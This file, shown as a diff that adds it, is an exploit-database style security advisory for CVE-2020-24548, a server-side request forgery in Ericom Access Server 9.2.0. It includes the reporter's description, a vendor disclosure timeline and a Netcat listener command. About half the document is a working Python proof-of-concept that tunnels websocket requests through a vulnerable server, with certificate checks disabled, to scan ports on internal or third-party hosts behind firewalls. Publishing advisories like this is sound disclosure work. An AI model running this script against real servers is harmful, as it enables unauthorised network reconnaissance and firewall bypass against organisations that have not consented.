@@ -1,0 +1,170 @@
+# Exploit Title: Ericom Access Server x64 9.2.0 - Server-Side Request Forgery
+# Date: 2020-08-22
+# Exploit Author: hyp3rlinx
+# Vendor Homepage: www.ericom.com
+# Version: Ericom Access Server x64 for (AccessNow & Ericom Blaze) v9.2.0
+# CVE: CVE-2020-24548
+
+[+] Credits: John Page (aka hyp3rlinx)
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/ERICOM-ACCESS-SERVER-ACCESS-NOW-BLAZE-9.2.0-SERVER-SIDE-REQUEST-FORGERY.txt
+[+] twitter.com/hyp3rlinx
+[+] ISR: ApparitionSec     
+ 
+
+[Vendor]
+www.ericom.com
+
+
+[Product]
+Ericom Access Server x64 for (AccessNow & Ericom Blaze) v9.2.0
+
+AccessNow is an HTML5 remote desktop gateway that works from any device with an HTML5 compatible browser,
+including from Chromebooks and locked down devices. Ericom Blaze provides remote desktop connectivity from
+Mac, Windows and Linux devices to applications on office / home PCs and virtual desktops (VDI).
+
+
+[Vulnerability Type]
+Server Side Request Forgery
+
+
+[CVE Reference]
+CVE-2020-24548
+
+
+[Security Issue]
+Ericom Access Server allows attackers to initiate SSRF requests making outbound
+connections to arbitrary hosts and TCP ports. Attackers, who can reach the
+AccessNow server can target internal systems that are behind firewalls that are
+typically not accessible. This can also be used to target third-party systems
+from the AccessNow server itself.
+
+The AccessNow server will return an attacker friendly response, exfiltrating
+which ports are listening for connections. This can bypass Firewall rules and
+undermine the integrity of other systems and security controls in place.
+
+E.g. listen using Netcat, Nc64.exe -llvp 25
+
+A) Ericom Server  192.168.88.152 (defaults port 8080)
+B) Attacker   192.168.88.162
+C) Victim  192.168.1.104
+
+Using Wireshark we can observe A sends a SYN packet to C (port 25)
+C sends SYN/ACK to A
+A sends ACK to C. 
+A sends ACK/FIN to C port 25.
+
+We will then get an AccessNow server response similar to below.
+["C","M",["Cannot connect to '192.168.1.104:25'.",true]]
+
+This message indicates we cannot connect and helpfully informs us of closed vs open ports.
+
+[Affected Component]
+Ericom Server port 8080 will forward connections to arbitrary Hosts and or Ports
+which are sent using Web-Socket requests. Ericom server then replies with a
+"Cannot connect to" message if a port is in a closed state.
+
+
+[Attack Vectors]
+Remote attackers can abuse the Ericom Access Server to conduct port
+scans on arbitrary systems. This is possible due to a server side
+request forgery vulnerability and using a remote TCP socket program.
+
+
+[Impact Information Disclosure]
+true
+
+
+[CVE Impact Other]
+Exfiltration of open ports
+
+
+[Exploit/POC]
+import sys,ssl
+import websocket
+##pip install websocket-client   #Required
+
+#By hyp3rlinx
+#ApparitionSec
+#========================================================
+#Ericom Access Server v9.2.0 for (AccessNow & Blaze) SSRF
+#========================================================
+
+BANNER="""
+  ______                      _____                
+ |  ____|                    / ____|               
+ | |__   _ __ _ __ ___  _ __| |     ___  _ __ ___  
+ |  __| | '__| '__/ _ \| '__| |    / _ \| '_ ` _ \ 
+ | |____| |  | | | (_) | |  | |___| (_) | | | | | |
+ |______|_|  |_|  \___/|_|   \_____\___/|_| |_| |_| 
+                                       SSRF Exploit
+"""
+
+def ErrorCom(vs,vp,t,p):
+    try:
+        ws = websocket.create_connection("wss://"+vs+":"+vp+"/blaze/"+t+":"+p, sslopt={'cert_reqs': ssl.CERT_NONE})
+        ws.send("SSRF4U!")
+        result =  ws.recv()
+        #print(result)
+        if result.find("Cannot connect to")==-1:
+            print("[+] Port "+p+" is open for business :)")
+        else:
+            print("[!] Port " + p+ " is closed :(")
+        ws.close()
+    except Exception as e:
+        print(str(e))
+
+if __name__=="__main__":
+
+    if len(sys.argv) != 5:
+        print(BANNER)
+        print("[+] Ericom Access Server v9.2.0 - SSRF Exploit - CVE-2020-24548")
+        print("[+] By Hyp3rlinX / ApparitionSec")
+        print("[!] Usage: <vuln-server>,<port (usually 8080)>,<target>,<port-to-scan>")
+        exit()
+
+    if len(sys.argv[4]) > 5:
+        print("[!] Port out of range")
+        exit()    
+
+    print(BANNER)
+    ErrorCom(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
+
+
+
+
+[PoC Video URL]
+https://www.youtube.com/watch?v=oDTd-yRxVJ0
+
+
+[Network Access]
+Remote
+
+
+[Severity]
+Medium
+
+
+[Disclosure Timeline]
+Vendor Notification : June 21, 2020
+Received automated reply : June 21, 2020
+Request for status : June 30, 2020
+Vendor "Forwarded all the detail to our R&D and Management team" : June 30, 2020
+Request for status : July 13, 2020 
+No vendor reponse
+Informed vendor advisory: August 11, 2020
+Request for status : August 20, 2020 
+No vendor reponse
+August 22, 2020 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
